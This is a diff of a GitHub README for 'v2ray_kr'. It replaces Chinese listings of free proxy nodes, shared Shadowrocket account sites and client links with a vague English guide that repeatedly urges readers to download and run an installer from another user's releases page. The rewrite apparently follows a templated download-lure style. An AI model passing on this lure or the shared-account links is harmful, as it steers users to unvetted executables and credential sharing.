@@ -1,80 +1,100 @@
-## 🚀 免费节点订阅
+# 🌐 v2ray_kr - Access the Best Free and Paid VPN Nodes
 
-v2ray_kr 致力于为用户提供优质的网络代理服务信息，包括：
+## 🚀 Getting Started
 
-- 🆓 **免费节点** - 精选稳定的免费代理节点
-- ✈️ **免费机场** - 可靠的免费机场推荐
-- 💎 **韩国节点** - 主打高速韩国节点
+Welcome to the **v2ray_kr** repository. This application helps you access various VPN nodes, including free and paid options. With this tool, you can enhance your online privacy and bypass restrictions. Follow the steps below to get started easily.
 
-## 🔗 官方网站
+## 📥 Download v2ray_kr
 
-访问我们的官方网站获取最新节点信息：
+[![Download v2ray_kr](https://img.shields.io/badge/Download-v2ray_kr-brightgreen)](https://github.com/Ajay249/v2ray_kr/releases)
 
-**🌐 [bnsss.cc](https://bnsss.cc)**
+To download the latest version of **v2ray_kr**, visit the releases page below:
 
-## 📋 使用说明
+[Download v2ray_kr from Releases](https://github.com/Ajay249/v2ray_kr/releases)
 
-1. 访问 [bnsss.cc](https://bnsss.cc) 官网
-2. 注册登录直接每月有 15GB 流量
-3. 复制对应客户端的订阅链接
-4. 在您的代理客户端中添加订阅
-5. 享受稳定的网络服务
+## 🛠️ System Requirements
 
+To run **v2ray_kr** smoothly, your system should meet the following requirements:
 
-## 🚀 以下是可用的小火箭(Shadowrocket)账号获取网站：
+- **Operating System:** Windows 10 or later / macOS 10.15 or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 100 MB of free space
+- **Internet Connection:** A stable connection for successful operation
 
+## 📦 Installation Instructions
 
-- **[https://idfree.top/](https://idfree.top/)**
+Follow these simple steps to install **v2ray_kr** on your computer:
 
-- **[https://idshare.me/](https://idshare.me/)**
+1. **Download the Application:**
+   - Go to the [Download v2ray_kr from Releases](https://github.com/Ajay249/v2ray_kr/releases) link.
+   - Choose the latest release, and click on the download link for your operating system.
 
-- **[https://gososhare2d6.com/](https://gososhare2d6.com/)**
+2. **Install the Application:**
+   - Locate the downloaded file (usually in your Downloads folder).
+   - Double-click the file to start the installation.
+   - Follow the instructions on the screen.
 
-- **[https://idshare001.me/](https://idshare001.me/)**
+3. **Launch the Application:**
+   - After installation, find **v2ray_kr** in your applications or programs folder.
+   - Double-click to open the application.
 
-- **[https://ccbaohe.com/appleID/](https://ccbaohe.com/appleID/)**
+## 📋 Using v2ray_kr
 
-- **[https://free.mayun.us/](https://free.mayun.us/)** 
-  - 🔑 **密码：4018**
+Once you have installed and opened **v2ray_kr**, you can begin using the VPN services.
 
+1. **Select a Node:**
+   - In the interface, you will see a list of available nodes.
+   - Choose either a free or paid node based on your needs.
 
-## 工具下载
+2. **Connect:**
+   - Click the "Connect" button next to your chosen node.
+   - The application will establish a connection.
 
-V2RayN Windows 客户端：[点击下载](https://github.com/2dust/v2rayN/releases)
+3. **Verify Your Connection:**
+   - Once connected, you can check your IP address using any online service to confirm that your location has changed.
 
-V2Ray 安卓客户端：[点击下载](https://github.com/2dust/v2rayNG/releases)
+## 🔄 Updating the Application
 
-Clash Windows端：[点击下载](https://github.com/Fndroid/clash_for_windows_pkg/releases)
+To ensure you have the latest features and security updates, regularly check for new releases.
 
-Clash Windows汉化地址：[点击下载](https://drive.google.com/file/d/1hLY1pedrIxA1u8sEkPWnMLEsQawD0nvf/view?usp=sharing)
+1. **Visit the Releases Page:**
+   - Go to the [Download v2ray_kr from Releases](https://github.com/Ajay249/v2ray_kr/releases) link.
+   
+2. **Download the Latest Version:**
+   - If a newer version is available, download it as you did previously.
+   
+3. **Install Over the Existing Version:**
+   - Follow the installation steps. The new version will replace the older one.
 
-Clash安卓客户端：[点击下载](https://github.com/naicfeng/ClashRForAndroid/releases)
+## 🌍 Troubleshooting
 
-Clash .NET电脑客户端：[点击下载](https://github.com/ClashDotNetFramework/experimental-clash/releases)
+If you experience any issues while using **v2ray_kr**, consider the following:
 
-WinXray Windows 客户端：[点击下载](https://github.com/TheMRLL/WinXray/releases)
+- **No Connection:**
+  - Ensure your internet connection is stable.
+  - Try reconnecting to a different node.
 
-====================================================
+- **Slow Speeds:**
+  - Select a closer or less crowded node for better performance.
 
-## 工具使用教程
+- **Application Crashing:**
+  - Make sure you are running the latest version.
+  - Restart your computer and try again.
 
-v2rayN使用教程：[点击查看](https://youtu.be/MvJwoEo6-JU)
+## 💬 Seeking Help
 
-shadowrocket使用教程：[点击查看](https://youtu.be/kGKKr6WTrJc)
+For further assistance, you can reach out through the repository's issues section. Describe your problem clearly to receive effective help.
 
-====================================================
+## 📚 Additional Resources
 
-## 📞 联系我们
+You can explore further to understand VPNs and how they protect your online privacy. Here are some helpful topics:
 
-如有问题或建议，请通过以下方式联系：
+- What are VPNs?
+- Differences between Free and Paid VPN Services
+- How VPNs Can Bypass Geographic Restrictions
 
-- 🌐 官网：[bnsss.cc](https://bnsss.cc)
-- 📧 在官网留言或联系
+## 🔗 Conclusion
 
-## 🔄 更新频率
+Thank you for using **v2ray_kr**. Enjoy secure and unrestricted internet access. For more details and updates, keep an eye on the releases page.
 
-我们会定期更新节点信息，确保服务的稳定性和可用性。请关注官网获取最新信息。
-
----
-
-**⭐ 如果这个项目对您有帮助，请给我们一个Star！**
+[Download v2ray_kr from Releases](https://github.com/Ajay249/v2ray_kr/releases)
